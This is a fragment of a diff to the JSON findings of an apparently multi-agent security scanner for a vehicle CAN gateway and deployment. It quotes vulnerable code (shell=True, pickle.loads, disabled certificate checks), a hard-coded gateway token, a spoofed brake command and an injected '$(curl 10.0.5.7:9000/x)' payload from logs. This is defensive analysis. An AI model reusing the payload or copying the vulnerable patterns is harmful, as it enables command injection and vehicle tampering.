+    "reason": "H_a judge refused: The objective is to produce a defensive action, but isolating a node with the destination set to 'internal' does not align with this objective. Isolation typically serves to protect external threats or prevent internal threats from spreading, but the context suggests the action is being applied to a testbench, which may not be under threat. Additionally, the destination 'internal' implies that the isolation is not preventing external access, which is typically a defensive measure."
+  },
+  "trajectory_verdict": {
+    "allowed": true,
+    "compositional_ok": true,
+    "temporal_ok": true,
+    "violations": []
   },
   "findings": [
     {
@@ -1873,7 +865,7 @@
       "evidence": "02_can_gateway.py: n-can   GATEWAY_API_TOKEN = \"bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d\"   # CODE-003   @dat",
       "explanation": "Hard-coded secret \u2014 Hard-coded secrets leak via repo / binary.",
       "source_agent": "source_code_scanner",
-      "asset_category": "Material and Economic Resources",
+      "asset_category": "Life and Bodily Health",
       "line": 28
     },
     {
@@ -1882,7 +874,7 @@
       "evidence": "02_can_gateway.py: ct:     # CODE-005: pickle.loads on untrusted networ",
       "explanation": "Unsafe deserialization (pickle / yaml.load / eval)",
       "source_agent": "source_code_scanner",
-      "asset_category": "Material and Economic Resources",
+      "asset_category": "Life and Bodily Health",
       "line": 58
     },
     {
@@ -1891,7 +883,7 @@
       "evidence": "02_can_gateway.py: t \u2192 RCE.     return pickle.loads(blob)   def upload_",
       "explanation": "Unsafe deserialization (pickle / yaml.load / eval)",
       "source_agent": "source_code_scanner",
-      "asset_category": "Material and Economic Resources",
+      "asset_category": "Life and Bodily Health",
       "line": 59
     },
     {
@@ -1915,20 +907,56 @@
     {
       "rule_id": "CODE-001",
       "severity": "high",
-      "evidence": "subprocess.call(user_input, shell=True)",
-      "explanation": "Shell-injection sink fed by untrusted input.",
+      "evidence": "subprocess.check_output(f\"sysdiag --actuator={actuator_name} --json\", shell=True, text=True)",
+      "explanation": "The use of shell=True with subprocess.check_output allows command injection if actuator_name is attacker-controlled. This can lead to remote code execution.",
       "source_agent": "source_code_scanner",
       "asset_category": null,
-      "line": 14
+      "line": 43
     },
     {
-      "rule_id": "CODE-002",
-      "severity": "medium",
-      "evidence": "hashlib.md5(password)",
-      "explanation": "Weak hash algorithm for password storage.",
+      "rule_id": "CODE-003",
+      "severity": "critical",
+      "evidence": "GATEWAY_API_TOKEN = \"bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d\"",
+      "explanation": "Hard-coded secret found in the source code. This can lead to unauthorized access if the code is leaked or shared.",
       "source_agent": "source_code_scanner",
       "asset_category": null,
-      "line": 22
+      "line": 28
+    },
+    {
+      "rule_id": "CODE-005",
+      "severity": "critical",
+      "evidence": "return pickle.loads(blob)",
+      "explanation": "Using pickle.loads on untrusted network input can lead to remote code execution. Pickle is unsafe for deserializing data from untrusted sources.",
+      "source_agent": "source_code_scanner",
+      "asset_category": null,
+      "line": 58
+    },
+    {
+      "rule_id": "CODE-006",
+      "severity": "high",
+      "evidence": "ctx.check_hostname = False",
+      "explanation": "Disabling hostname verification in SSL context can lead to man-in-the-middle attacks, as it allows connections to servers with invalid or spoofed certificates.",
+      "source_agent": "source_code_scanner",
+      "asset_category": null,
+      "line": 67
+    },
+    {
+      "rule_id": "CODE-006",
+      "severity": "high",
+      "evidence": "ctx.verify_mode = ssl.CERT_NONE",
+      "explanation": "Disabling certificate verification in SSL context can lead to man-in-the-middle attacks, as it allows connections to servers with invalid or spoofed certificates.",
+      "source_agent": "source_code_scanner",
+      "asset_category": null,
+      "line": 68
+    },
+    {
+      "rule_id": "CODE-040",
+      "severity": "high",
+      "evidence": "gateway_loop()",
+      "explanation": "The gateway_loop function is called without any authentication checks, allowing unauthorized access to sensitive operations.",
+      "source_agent": "source_code_scanner",
+      "asset_category": null,
+      "line": 91
     },
     {
       "rule_id": "LOG-CAN-02",
@@ -1940,19 +968,28 @@
       "line": null
     },
     {
-      "rule_id": "LOG-NET-01",
-      "severity": "high",
-      "evidence": "10.0.0.42 \u2192 10.0.0.255 :7000 burst 1200 pkts/s",
-      "explanation": "Sudden internal broadcast burst \u2014 possible reconnaissance.",
+      "rule_id": "LOG-CAN-02",
+      "severity": "critical",
+      "evidence": "2026-05-19T13:42:14Z can0 burst arb=0x7E0 count=312 window=200ms src=BodyCtrl",
+      "explanation": "A burst of 312 frames with gateway-only CAN-ID (0x7E0) from BodyCtrl ECU within 200ms suggests a high-volume CAN-bus injection attack.",
       "source_agent": "log_analyzer",
       "asset_category": null,
       "line": null
     },
     {
-      "rule_id": "LOG-AUTH-03",
-      "severity": "medium",
-      "evidence": "12 failed auth attempts in 30 s, user='root'",
-      "explanation": "Brute-force pattern on privileged account.",
+      "rule_id": "LOG-CAN-02",
+      "severity": "critical",
+      "evidence": "2026-05-19T13:42:14Z can0 frame arb=0x2F1 dlc=8 src=BodyCtrl bus_load=27% payload=\"deceleration=-13.2 m/s^2\" anomaly=\"brake command from non-brake ECU\"",
+      "explanation": "Unauthorized brake command issued by BodyCtrl ECU, which is not responsible for brake control, indicating potential CAN-bus injection.",
+      "source_agent": "log_analyzer",
+      "asset_category": null,
+      "line": null
+    },
+    {
+      "rule_id": "LOG-CAN-02",
+      "severity": "critical",
+      "evidence": "2026-05-19T13:42:15Z can0 frame arb=0x310 dlc=8 src=BodyCtrl bus_load=27% payload=\"diag actuator=\"$(curl 10.0.5.7:9000/x)\"\"",
+      "explanation": "Suspicious diagnostic command from BodyCtrl ECU containing a curl command, indicating potential unauthorized remote access or data exfiltration attempt.",
       "source_agent": "log_analyzer",
       "asset_category": null,
       "line": null
@@ -1987,27 +1024,77 @@
     {
       "rule_id": "TOP-001",
       "severity": "high",
-      "evidence": "HighPerformanceComputer\u2192ZoneECU on CAN (not Ethernet)",
-      "explanation": "Violates HPCtoZoneEthernetIEEE1722 architectural rule.",
+      "evidence": "Edge from hpc to zone_ecu_front uses transport=can_fd and standard=vendor_specific.",
+      "explanation": "The connection between the HighPerformanceComputer and ZoneECU must be Ethernet/IEEE-1722 to ensure reliable and standardized communication. The current configuration violates this requirement.",
       "source_agent": "deployment_scanner",
       "asset_category": null,
       "line": null
     },
     {
       "rule_id": "TOP-002",
+      "severity": "high",
+      "evidence": "External actor ext_assistant writes to long_term_memory.",
+      "explanation": "External actors must not write to long-term memory unless they are authenticated. The ext_assistant has a trust level of 'external', which violates this rule.",
+      "source_agent": "deployment_scanner",
+      "asset_category": null,
+      "line": null
+    },
+    {
+      "rule_id": "TOP-007",
+      "severity": "high",
+      "evidence": "Safety actuator brake_ecu commanded by non-safety actor zone_ecu_front.",
+      "explanation": "Brake ECUs should only receive commands from safety-related sources to ensure the integrity and safety of braking operations. The current configuration allows zone_ecu_front, a non-safety actor, to command the brake_ecu, violating this rule.",
+      "source_agent": "deployment_scanner",
+      "asset_category": null,
+      "line": null
+    },
+    {
+      "rule_id": "TOP-003",
       "severity": "medium",
-      "evidence": "External A2A agent has write-edge to long_term_memory",
-      "explanation": "Datasource is writable by an unauthenticated actor (poison path).",
+      "evidence": "No evidence provided in the deployment config.",
+      "explanation": "The rule requires that steering command angles must be within \u00b115 degrees. The deployment config does not provide specific evidence of steering angles, so this rule cannot be evaluated without additional data.",
+      "source_agent": "deployment_scanner",
+      "asset_category": null,
+      "line": null
+    },
+    {
+      "rule_id": "TOP-004",
+      "severity": "high",
+      "evidence": "No edge from public_internet to admin_* found in the deployment config.",
+      "explanation": "This rule ensures that admin portals are not exposed to the public internet without proper security measures like WAF and allow-list. The current config does not show any such exposure, so no violation is detected.",
+      "source_agent": "deployment_scanner",
+      "asset_category": null,
+      "line": null
+    },
+    {
+      "rule_id": "TOP-005",
+      "severity": "high",
+      "evidence": "No evidence provided in the deployment config.",
+      "explanation": "Datastores must not bind to 0.0.0.0 unless behind PrivateLink. The deployment config does not specify bind addresses for datastores, so this rule cannot be evaluated without additional data.",
+      "source_agent": "deployment_scanner",
+      "asset_category": null,
+      "line": null
+    },
+    {
+      "rule_id": "TOP-006",
+      "severity": "critical",
+      "evidence": "No evidence provided in the deployment config.",
+      "explanation": "Secrets stores must not be world-readable. The deployment config does not specify the configuration of secrets stores, so this rule cannot be evaluated without additional data.",
+      "source_agent": "deployment_scanner",
+      "asset_category": null,
+      "line": null
+    },
+    {
+      "rule_id": "TOP-008",
+      "severity": "medium",
+      "evidence": "Edge from pirate_radio to ivi with primitive=respond.",
+      "explanation": "External A2A agents should not have respond edges to in-vehicle agents to prevent unauthorized interactions. The pirate_radio actor, an external user, can respond to the ivi, an in-vehicle agent, which violates this rule.",
       "source_agent": "deployment_scanner",
       "asset_category": null,
       "line": null
     }
   ],
-  "committed": {
-    "action": "isolate_node",
-    "target": "TESTBENCH-01",
-    "parameters": {
-      "target": "TESTBENCH-01"
-    }
-  }
+  "consulted_memory": [],
+  "committed": null,
+  "memory_recorded": true
 }
